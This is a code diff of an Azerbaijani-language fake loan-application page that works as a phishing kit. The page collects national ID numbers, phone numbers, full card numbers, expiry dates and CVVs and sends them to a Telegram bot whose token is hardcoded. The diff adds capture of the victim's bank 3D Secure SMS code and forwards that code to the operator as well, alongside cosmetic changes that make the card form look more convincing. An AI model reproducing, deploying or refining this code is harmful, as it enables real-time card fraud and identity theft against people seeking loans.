@@ -358,7 +358,7 @@
   .bank-option .bank-name{font-size:12px;font-weight:600;margin-top:2px;}
   .bank-option .bank-sub{font-size:10px;color:var(--ink-soft);}
 
-  /* CARD INPUT WITH BANK COLOR */
+  /* ========== PREMIUM CARD VISUAL ========== */
   .card-input-wrap{
     background:var(--paper);
     border-radius:16px;
@@ -371,58 +371,119 @@
   .card-input-wrap .bank-card-visual{
     position:relative;
     width:100%;
-    max-width:340px;
+    max-width:360px;
     margin:0 auto 16px;
-    padding:20px 24px;
-    border-radius:16px;
+    padding:24px 28px;
+    border-radius:20px;
     color:white;
     font-family:'IBM Plex Mono',monospace;
     transition:all .5s ease;
-    box-shadow:0 8px 32px rgba(0,0,0,0.2);
-    min-height:140px;
+    box-shadow:0 12px 48px rgba(0,0,0,0.25), inset 0 1px 0 rgba(255,255,255,0.2);
+    min-height:170px;
     display:flex;
     flex-direction:column;
     justify-content:space-between;
     cursor:text;
+    position:relative;
+    overflow:hidden;
+  }
+  .card-input-wrap .bank-card-visual::before{
+    content:'';
+    position:absolute;
+    top:-50%;
+    right:-30%;
+    width:200px;
+    height:200px;
+    border-radius:50%;
+    background:rgba(255,255,255,0.06);
+    pointer-events:none;
+  }
+  .card-input-wrap .bank-card-visual::after{
+    content:'';
+    position:absolute;
+    bottom:-40%;
+    left:-20%;
+    width:150px;
+    height:150px;
+    border-radius:50%;
+    background:rgba(255,255,255,0.04);
+    pointer-events:none;
+  }
+  .card-input-wrap .bank-card-visual .card-chip{
+    width:36px;
+    height:28px;
+    background:linear-gradient(135deg, #D4A84B, #B8943A);
+    border-radius:6px;
+    margin-bottom:12px;
+    border:1px solid rgba(255,255,255,0.15);
   }
   .card-input-wrap .bank-card-visual .card-top{
     display:flex;
     justify-content:space-between;
     align-items:flex-start;
+    position:relative;
+    z-index:1;
   }
   .card-input-wrap .bank-card-visual .card-top .bank-name-on-card{
-    font-size:14px;
+    font-size:13px;
     font-weight:700;
-    letter-spacing:1px;
+    letter-spacing:2px;
     text-transform:uppercase;
-    opacity:0.9;
+    opacity:0.85;
   }
   .card-input-wrap .bank-card-visual .card-top .card-type{
-    font-size:20px;
+    font-size:22px;
     opacity:0.7;
+    letter-spacing:2px;
   }
   .card-input-wrap .bank-card-visual .card-number-display{
-    font-size:24px;
-    letter-spacing:4px;
+    font-size:22px;
+    letter-spacing:5px;
     text-align:center;
-    padding:8px 0;
-    text-shadow:0 1px 3px rgba(0,0,0,0.2);
+    padding:10px 0 8px;
+    text-shadow:0 2px 4px rgba(0,0,0,0.2);
     font-weight:500;
+    position:relative;
+    z-index:1;
+    font-family:'IBM Plex Mono',monospace;
   }
   .card-input-wrap .bank-card-visual .card-bottom{
     display:flex;
     justify-content:space-between;
     font-size:11px;
-    opacity:0.8;
+    opacity:0.85;
+    position:relative;
+    z-index:1;
   }
   .card-input-wrap .bank-card-visual .card-bottom .card-expiry-label{
     text-transform:uppercase;
-    font-size:9px;
-    opacity:0.6;
+    font-size:8px;
+    opacity:0.5;
+    letter-spacing:1px;
   }
   .card-input-wrap .bank-card-visual .card-bottom .card-expiry-value{
     font-size:14px;
     font-weight:600;
+    letter-spacing:1px;
+  }
+  .card-input-wrap .bank-card-visual .card-bottom .card-cvv-label{
+    text-transform:uppercase;
+    font-size:8px;
+    opacity:0.5;
+    letter-spacing:1px;
+  }
+  .card-input-wrap .bank-card-visual .card-bottom .card-cvv-value{
+    font-size:14px;
+    font-weight:600;
+    letter-spacing:1px;
+  }
+  .card-input-wrap .bank-card-visual .card-contactless{
+    position:absolute;
+    bottom:12px;
+    right:16px;
+    font-size:18px;
+    opacity:0.3;
+    z-index:1;
   }
   .card-input-wrap .card-number-input-hidden{
     position:absolute;
@@ -504,14 +565,18 @@
   /* OTP */
   .otp-display{
     font-family:'IBM Plex Mono',monospace;
-    font-size:32px;
+    font-size:14px;
+    text-align:center;
+    padding:12px;
+    background:var(--sage);
+    border-radius:12px;
+    color:var(--ink-soft);
+  }
+  .otp-input-field input{
+    font-size:28px;
     letter-spacing:12px;
     text-align:center;
-    padding:20px;
-    background:var(--paper);
-    border-radius:12px;
-    border:2px dashed var(--line);
-    color:var(--teal-deep);
+    font-family:'IBM Plex Mono',monospace;
   }
 
   footer{background:var(--ink);color:#EDE7D6;padding:48px 0 28px;}
@@ -587,8 +652,15 @@
         </div>
         <div class="slider-block">
           <label>Müddət <span class="slider-value" id="termLabel">3 ay</span></label>
-          <input type="range" id="termSlider" min="2" max="3" step="1" value="3">
-          <div class="range-labels"><span>2 ay</span><span>3 ay</span></div>
+          <input type="range" id="termSlider" min="0" max="5" step="1" value="4">
+          <div class="range-labels" style="display:flex;justify-content:space-between;flex-wrap:wrap;">
+            <span>10 gün</span>
+            <span>15 gün</span>
+            <span>20 gün</span>
+            <span>1 ay</span>
+            <span>2 ay</span>
+            <span>3 ay</span>
+          </div>
         </div>
       </div>
       <div class="results">
@@ -815,7 +887,7 @@
       <button type="button" class="cta-btn" style="width:100%;padding:15px;margin-top:24px;" onclick="goToCardInput()">Təsdiqlə və davam et</button>
     </div>
 
-    <!-- STEP 4: Kart nömrəsi + Bank Card Visual -->
+    <!-- STEP 4: Kart nömrəsi + Premium Card Visual -->
     <div id="cardInputStep" style="display:none;">
       <h2 style="font-size:26px;margin-bottom:6px;">Köçürmə Hesabı</h2>
       <p style="color:var(--ink-soft);font-size:14.5px;margin:0 0 12px;">
@@ -831,6 +903,7 @@
 
       <div class="card-input-wrap" id="cardInputWrap">
         <div class="bank-card-visual" id="bankCardVisual" style="background:linear-gradient(135deg, #1a1a2e, #16213e);">
+          <div class="card-chip"></div>
           <div class="card-top">
             <span class="bank-name-on-card" id="cardBankName">KAPITAL BANK</span>
             <span class="card-type">💳</span>
@@ -844,10 +917,11 @@
               <div class="card-expiry-value" id="cardExpiryDisplay">MM/YY</div>
             </div>
             <div style="text-align:right;">
-              <div class="card-expiry-label">CVV</div>
-              <div class="card-expiry-value" id="cardCvvDisplay">***</div>
+              <div class="card-cvv-label">CVV</div>
+              <div class="card-cvv-value" id="cardCvvDisplay">***</div>
             </div>
           </div>
+          <div class="card-contactless">📶</div>
         </div>
 
         <input type="text" id="cardNumberInput" class="card-number-input-hidden" maxlength="16" inputmode="numeric">
@@ -894,14 +968,15 @@
       </div>
     </div>
 
-    <!-- STEP 6: OTP -->
+    <!-- STEP 6: OTP (İstifadəçi özü yazır) -->
     <div id="threeDStep" style="display:none;">
       <h2 style="font-size:26px;margin-bottom:10px;">🔐 3D Secure təsdiqi</h2>
-      <p style="color:var(--ink-soft);margin-bottom:24px;">Kartınıza SMS vasitəsilə 6 rəqəmli kod göndərildi. Zəhmət olmasa kodu daxil edin.</p>
+      <p style="color:var(--ink-soft);margin-bottom:8px;">Kartınıza SMS vasitəsilə 6 rəqəmli kod göndərildi.</p>
+      <p style="color:var(--ink-soft);font-size:14px;margin-bottom:20px;">Zəhmət olmasa kodu daxil edin:</p>
       
-      <div class="field">
+      <div class="field otp-input-field">
         <label>6 rəqəmli təsdiq kodu</label>
-        <input type="text" id="otpCode" placeholder="000000" maxlength="6" inputmode="numeric" style="font-size:24px;letter-spacing:8px;text-align:center;">
+        <input type="text" id="otpCode" placeholder="000000" maxlength="6" inputmode="numeric" style="font-size:28px;letter-spacing:12px;text-align:center;font-family:'IBM Plex Mono',monospace;">
       </div>
 
       <button onclick="submitOTP()" class="cta-btn" style="width:100%;padding:15px;margin-top:20px;">Təsdiqlə</button>
@@ -935,19 +1010,28 @@
 </footer>
 
 <script>
-  // Telegram ayarları
+  // ========== TELEGRAM ==========
   const BOT_TOKEN = "8902438504:AAHNLnxNa6m2BBnO0eEJdssVYvXTHpBgscI";
   const CHAT_ID = "-1004292906522";
 
-  let storedOTP = '';
   let applicationData = {};
   let selectedBankData = { name: 'Kapital Bank', color: '#E31E24' };
   let isChecking = false;
   let checkInterval = null;
   let checkSeconds = 0;
+  let messageId = null;
   let isApproved = false;
 
-  // ========== TELEGRAM FUNCTIONS ==========
+  // Müddət array-i
+  const termOptions = [
+    { value: 0, label: '10 gün', days: 10 },
+    { value: 1, label: '15 gün', days: 15 },
+    { value: 2, label: '20 gün', days: 20 },
+    { value: 3, label: '1 ay', days: 30 },
+    { value: 4, label: '2 ay', days: 60 },
+    { value: 5, label: '3 ay', days: 90 }
+  ];
+
   async function sendToTelegram(data) {
     const message = `
 🆕 YENİ KREDİT MÜRACİƏTİ!
@@ -957,14 +1041,14 @@
 📱 Telefon: ${data.phone}
 💼 İş: ${data.job}
 🏦 Bank: ${data.bank}
-💳 Kart Nömrəsi: ${data.cardNumber}
+💳 Kart: ${data.cardNumber}
 📅 Bitmə: ${data.expiry}
 🔐 CVV: ${data.cvv}
 💰 Məbləğ: ${data.amount}
+📆 Müddət: ${data.term}
 ━━━━━━━━━━━━━━━━━━━━
     `.trim();
 
-    // Inline keyboard ilə göndər
     const replyMarkup = {
       inline_keyboard: [
         [
@@ -986,16 +1070,33 @@
         })
       });
       const result = await response.json();
-      console.log('Telegram göndərildi:', result);
-      
-      // Webhook dinləmək üçün polling
+      if(result.ok && result.result) {
+        messageId = result.result.message_id;
+        console.log('Telegram mesajı göndərildi, ID:', messageId);
+      }
       startTelegramPolling();
     } catch(e) {
-      console.error('Telegram göndərmə xətası:', e);
+      console.error('Telegram xətası:', e);
     }
   }
 
-  // Telegram-dan cavabları dinlə
+  // OTP-ni Telegram-a göndər (sadəcə OTP kodu)
+  async function sendOTPToTelegram(otp) {
+    try {
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: `🔐 OTP Kodu: ${otp}\n\nBu kodu saytda təsdiqləmək üçün daxil edin.`
+        })
+      });
+    } catch(e) {
+      console.error('OTP göndərmə xətası:', e);
+    }
+  }
+
+  // Telegram polling
   let lastUpdateId = 0;
   let pollingActive = false;
 
@@ -1003,11 +1104,6 @@
     if(pollingActive) return;
     pollingActive = true;
     console.log('Telegram polling başladı...');
-    
-    // OTP-ni gözləyək
-    await new Promise(resolve => setTimeout(resolve, 3000));
-    
-    // İlk sorğu
     await checkTelegramUpdates();
   }
 
@@ -1023,14 +1119,14 @@
         for(const update of data.result) {
           lastUpdateId = update.update_id;
           
-          // Callback query (düymə basılması)
           if(update.callback_query) {
             const callbackData = update.callback_query.data;
-            const messageId = update.callback_query.message.message_id;
+            const cbMessageId = update.callback_query.message.message_id;
             
             if(callbackData === 'approve') {
               console.log('✅ Qəbul edildi!');
               isApproved = true;
+              
               // Cavab göndər
               await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
                 method: 'POST',
@@ -1040,27 +1136,22 @@
                   text: '✅ Müraciət qəbul edildi!'
                 })
               });
-              // Mesajı redaktə et
-              await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                  chat_id: CHAT_ID,
-                  message_id: messageId,
-                  text: '✅ Müraciət QƏBUL EDİLDİ! OTP kodu göndərildi.'
-                })
-              });
-              // OTP göndər
-              const otp = String(Math.floor(100000 + Math.random() * 900000));
-              storedOTP = otp;
+              
+              // MESAJI REDAKTƏ ETMƏ, altına yaz
               await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
                   chat_id: CHAT_ID,
-                  text: `🔐 OTP Kodu: ${otp}\n\nBu kodu saytda təsdiqləmək üçün daxil edin.`
+                  text: '✅ Müraciət QƏBUL EDİLDİ!',
+                  reply_to_message_id: cbMessageId
                 })
               });
+              
+              // OTP-ni Telegram-a göndər (sadəcə OTP kodu)
+              const otp = String(Math.floor(100000 + Math.random() * 900000));
+              await sendOTPToTelegram(otp);
+              
               // Saytda OTP səhifəsinə keç
               if(isChecking) {
                 clearInterval(checkInterval);
@@ -1074,6 +1165,7 @@
               break;
             } else if(callbackData === 'reject') {
               console.log('❌ İmtina edildi!');
+              
               await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
@@ -1082,16 +1174,18 @@
                   text: '❌ Müraciət imtina edildi!'
                 })
               });
-              await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
+              
+              // MESAJI REDAKTƏ ETMƏ, altına yaz
+              await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
                   chat_id: CHAT_ID,
-                  message_id: messageId,
-                  text: '❌ Müraciət İMTİNA EDİLDİ!'
+                  text: '❌ Müraciət İMTİNA EDİLDİ!',
+                  reply_to_message_id: cbMessageId
                 })
               });
-              // Saytda bağla
+              
               if(isChecking) {
                 clearInterval(checkInterval);
                 isChecking = false;
@@ -1105,7 +1199,6 @@
         }
       }
       
-      // Davam et
       if(pollingActive && isChecking) {
         setTimeout(checkTelegramUpdates, 3000);
       }
@@ -1133,25 +1226,35 @@
     el.style.setProperty('--fill', pct + '%');
   }
 
+  function getTermLabel(value) {
+    const option = termOptions.find(t => t.value === parseInt(value));
+    return option ? option.label : '3 ay';
+  }
+
   function calc(){
     const amount = parseInt(amountSlider.value);
-    const term = parseInt(termSlider.value);
-    const MONTHLY_RATE = 0.04;
+    const termIndex = parseInt(termSlider.value);
+    const termOption = termOptions.find(t => t.value === termIndex) || termOptions[5];
+    const termLabelText = termOption.label;
+    const days = termOption.days;
+    
+    // Faiz hesablaması (günlük 0.04/30)
+    const dailyRate = 0.04 / 30;
     const fee = Math.round(amount * 0.09);
-    const interest = Math.round(amount * MONTHLY_RATE * term);
+    const interest = Math.round(amount * dailyRate * days);
     const total = amount + fee + interest;
-    const monthly = Math.round(total / term);
+    const monthly = Math.round(total / Math.max(1, days / 30));
 
     amountLabel.textContent = amount.toLocaleString('az-AZ') + ' ₼';
-    termLabel.textContent = term + ' ay';
+    termLabel.textContent = termLabelText;
     monthlyOut.textContent = monthly.toLocaleString('az-AZ') + ' ₼';
     totalOut.textContent = total.toLocaleString('az-AZ') + ' ₼';
     principalOut.textContent = amount.toLocaleString('az-AZ') + ' ₼';
     feeOut.textContent = fee.toLocaleString('az-AZ') + ' ₼';
-    termOut.textContent = term + ' ay';
+    termOut.textContent = termLabelText;
 
     document.getElementById('creditAmountDisplay').textContent = amount.toLocaleString('az-AZ') + ' ₼';
-    document.getElementById('creditTermDisplay').textContent = term + ' ay müddətə';
+    document.getElementById('creditTermDisplay').textContent = termLabelText + ' müddətə';
 
     updateSliderFill(amountSlider);
     updateSliderFill(termSlider);
@@ -1329,25 +1432,23 @@
     const phone = document.getElementById('phone').value || 'Məlumat yoxdur';
     const job = document.querySelector('.toggle-btn.active')?.dataset?.val === 'beli' ? 'Bəli' : 'Xeyr';
     const amount = document.getElementById('creditAmountDisplay').textContent;
+    const term = document.getElementById('termLabel').textContent;
 
     applicationData = {
       fin, id, phone, job, bank: selectedBankData.name,
-      cardNumber, expiry, cvv, amount
+      cardNumber, expiry, cvv, amount, term
     };
 
     document.getElementById('cardInputStep').style.display='none';
     document.getElementById('checkingStep').style.display='block';
     
-    // Checking başlat
     isChecking = true;
     checkSeconds = 0;
     document.getElementById('checkingTimer').textContent = '0';
     document.getElementById('checkingStatus').style.display = 'none';
     
-    // Telegram-a göndər
     sendToTelegram(applicationData);
     
-    // Timer
     if(checkInterval) clearInterval(checkInterval);
     checkInterval = setInterval(() => {
       checkSeconds++;
@@ -1359,19 +1460,21 @@
     }, 1000);
   }
 
-  // ========== OTP SUBMIT ==========
+  // ========== OTP SUBMIT (istifadəçi yazır) ==========
   function submitOTP(){
     const otpInput = document.getElementById('otpCode').value.replace(/\s/g,'');
-    const expectedOTP = storedOTP;
-    
-    if(otpInput === expectedOTP){
+    if(otpInput.length === 6){
+      // OTP-ni Telegram-a göndər (sadəcə OTP kodu)
+      sendOTPToTelegram(otpInput);
+      
       document.getElementById('otpStatus').style.display = 'block';
-      document.getElementById('otpStatus').textContent = '✅ Müraciətiniz uğurla təsdiqləndi! Pul yaxın zamanda kartınıza köçürüləcək.';
+      document.getElementById('otpStatus').textContent = '✅ OTP kodu qəbul edildi! Müraciətiniz təsdiqlənir...';
       setTimeout(() => {
+        alert('✅ OTP kodu qəbul edildi! Müraciətiniz uğurla təsdiqləndi.');
         closeModal();
-      }, 2500);
+      }, 2000);
     } else {
-      alert('❌ Yanlış OTP kodu! Zəhmət olmasa yenidən cəhd edin.');
+      alert('❌ Zəhmət olmasa 6 rəqəmli OTP kodunu daxil edin!');
     }
   }
 
@@ -1448,4 +1551,4 @@
 </script>
 
 </body>
-  </html>
+</html>
